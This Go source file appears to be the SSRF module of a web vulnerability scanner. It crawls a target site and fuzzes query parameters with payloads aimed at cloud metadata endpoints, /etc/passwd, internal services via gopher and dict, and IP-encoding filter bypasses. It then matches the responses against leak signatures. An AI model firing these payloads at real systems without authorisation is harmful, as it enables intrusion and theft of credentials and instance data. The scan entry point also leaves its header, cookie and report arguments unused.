package vuln

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
)

// --- SSRF Scanner Implementation ---

// FindingSSRF describes a discovered potential SSRF
type FindingSSRF struct {
	Type            string `json:"type"`
	URL             string `json:"url"`
	Param           string `json:"param"`
	Payload         string `json:"payload"`
	ResponseSnippet string `json:"response_snippet"`
	Evidence        string `json:"evidence"`
	Timestamp       string `json:"timestamp"`
}

// SSRFScanner holds the state for the SSRF scan
type SSRFScanner struct {
	StartURL    *url.URL
	Client      *http.Client
	Visited     map[string]bool
	VisitedMu   sync.RWMutex
	Queue       chan ssrfCrawlJob
	Findings    []FindingSSRF
	FindingsMu  sync.Mutex
	Workers     int
	Active      int32
	MaxPages    int
	PageCount   int
	PageCountMu sync.Mutex
	MaxDepth    int
	Payloads    []string
	Throttle    time.Duration
}

// ssrfCrawlJob represents a URL to be scanned
type ssrfCrawlJob struct {
	URL   string
	Depth int
}

// init registers the SSRF check
func init() {
	vulns = append(vulns, VulnCheck{
		Name:    "SSRF",
		Param:   "url",
		Payload: "http://127.0.0.1:80",
		Match:   `Server|Apache|nginx|Bad Request`,
		Method:  "GET",
	})
}

// NewSSRFScanner creates a new instance of the SSRF scanner
func NewSSRFScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*SSRFScanner, error) {
	parsed, err := url.Parse(start)
	if err != nil {
		return nil, err
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
	}

	s := &SSRFScanner{
		StartURL: parsed,
		Client:   client,
		Visited:  make(map[string]bool),
		Queue:    make(chan ssrfCrawlJob, 1000),
		Findings: []FindingSSRF{},
		Workers:  workers,
		MaxPages: maxPages,
		MaxDepth: maxDepth,
		Throttle: throttle,
		Payloads: generateSSRFPayloads(),
	}
	return s, nil
}

// Run starts the scanning process
func (s *SSRFScanner) Run() {
	var wg sync.WaitGroup
	for i := 0; i < s.Workers; i++ {
		wg.Add(1)
		go s.worker(&wg)
	}

	s.enqueue(s.StartURL.String(), 0)

	for {
		time.Sleep(500 * time.Millisecond)
		s.PageCountMu.Lock()
		done := s.PageCount >= s.MaxPages
		s.PageCountMu.Unlock()

		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
			if done {
				break
			}
			time.Sleep(1 * time.Second)
			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
				break
			}
		}
	}
	close(s.Queue)
	wg.Wait()
}

func (s *SSRFScanner) worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range s.Queue {
		atomic.AddInt32(&s.Active, 1)
		s.PageCountMu.Lock()
		if s.PageCount >= s.MaxPages {
			s.PageCountMu.Unlock()
			atomic.AddInt32(&s.Active, -1)
			return
		}
		s.PageCountMu.Unlock()

		if !s.markVisited(job.URL) {
			atomic.AddInt32(&s.Active, -1)
			continue
		}

		log.Printf("[SSRF Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)

		s.fuzzURL(job.URL)

		if job.Depth < s.MaxDepth {
			s.crawl(job.URL, job.Depth)
		}
		atomic.AddInt32(&s.Active, -1)
	}
}

func (s *SSRFScanner) crawl(u string, depth int) {
	resp, err := s.Client.Get(u)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(ct), "text/html") {
		return
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return
	}

	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if !exists {
			return
		}
		absoluteURL, err := s.normalize(u, href)
		if err == nil {
			s.enqueue(absoluteURL, depth+1)
		}
	})
}

func (s *SSRFScanner) fuzzURL(rawURL string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}

	query := u.Query()
	if len(query) == 0 {
		return
	}

	for param, values := range query {
		originalValue := values[0]

		for _, payload := range s.Payloads {
			if s.Throttle > 0 {
				time.Sleep(s.Throttle)
			}

			newQuery := u.Query()
			newQuery.Set(param, payload)
			u.RawQuery = newQuery.Encode()
			testURL := u.String()

			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Knife-SSRF-Scanner/1.0")

			resp, err := s.Client.Do(req)
			if err != nil {
				continue
			}

			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(bodyBytes)

			if evidence, found := s.detectSSRF(bodyStr); found {
				s.addFinding(FindingSSRF{
					Type:            "SSRF",
					URL:             testURL,
					Param:           param,
					Payload:         payload,
					ResponseSnippet: snippet(bodyStr, 200),
					Evidence:        evidence,
				})
			}
		}
		_ = originalValue
	}
}

func (s *SSRFScanner) detectSSRF(body string) (string, bool) {
	signatures := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{regexp.MustCompile(`ami-id`), "AWS Metadata"},
		{regexp.MustCompile(`instance-id`), "AWS Metadata"},
		{regexp.MustCompile(`computeMetadata`), "GCP Metadata"},
		{regexp.MustCompile(`root:x:0:0`), "/etc/passwd content"},
		{regexp.MustCompile(`Connection refused`), "Connection Refused (Internal)"},
		{regexp.MustCompile(`Network is unreachable`), "Network Unreachable (Internal)"},
		// Specific service banners
		{regexp.MustCompile(`SSH-2.0`), "SSH Banner"},
		{regexp.MustCompile(`MySQL`), "MySQL Banner"},
	}

	for _, sig := range signatures {
		if sig.Pattern.MatchString(body) {
			match := sig.Pattern.FindString(body)
			return fmt.Sprintf("Matched signature: %s (%s)", sig.Name, match), true
		}
	}

	return "", false
}

func generateSSRFPayloads() []string {
	return []string{
		"http://127.0.0.1",
		"http://localhost",
		"http://127.0.0.1:80",
		"http://127.0.0.1:22",
		"http://127.0.0.1:3306",
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/user-data/",
		"http://[::1]",
		"http://0.0.0.0",
		"file:///etc/passwd",
		"file:///C:/Windows/win.ini",
		"dict://127.0.0.1:11211/",
		"sftp://127.0.0.1:22/",
		"tftp://127.0.0.1:69/",
		"ldap://127.0.0.1:389/",
		"gopher://127.0.0.1:6379/_",
		// Bypasses
		"http://2130706433", // Decimal IP
		"http://0177.0.0.1", // Octal IP
		"http://127.1",
		"http://localtest.me",
		"http://vcap.me",
	}
}

func (s *SSRFScanner) markVisited(u string) bool {
	s.VisitedMu.Lock()
	defer s.VisitedMu.Unlock()
	if s.Visited[u] {
		return false
	}
	s.Visited[u] = true
	s.PageCountMu.Lock()
	s.PageCount++
	s.PageCountMu.Unlock()
	return true
}

func (s *SSRFScanner) enqueue(u string, depth int) {
	u = strings.Split(u, "#")[0]
	s.VisitedMu.RLock()
	if s.Visited[u] {
		s.VisitedMu.RUnlock()
		return
	}
	s.VisitedMu.RUnlock()

	select {
	case s.Queue <- ssrfCrawlJob{URL: u, Depth: depth}:
	default:
	}
}

func (s *SSRFScanner) addFinding(f FindingSSRF) {
	s.FindingsMu.Lock()
	defer s.FindingsMu.Unlock()
	f.Timestamp = time.Now().Format(time.RFC3339)
	s.Findings = append(s.Findings, f)
	log.Printf("[!] SSRF FOUND: %s (Param: %s)\n", f.URL, f.Param)
}

func (s *SSRFScanner) normalize(base, href string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", err
	}
	h, err := url.Parse(href)
	if err != nil {
		return "", err
	}
	resolved := b.ResolveReference(h)
	return resolved.String(), nil
}

func RunSSRFScan(target string, headers map[string]string, cookies string, reportPath string) error {
	fmt.Println("[*] Starting SSRF Scanner on", target)

	scanner, err := NewSSRFScanner(target, 10, 100, 3, 200*time.Millisecond)
	if err != nil {
		return err
	}

	scanner.Run()

	fmt.Printf("[*] Scan complete. Found %d potential SSRFs.\n", len(scanner.Findings))

	return err
}
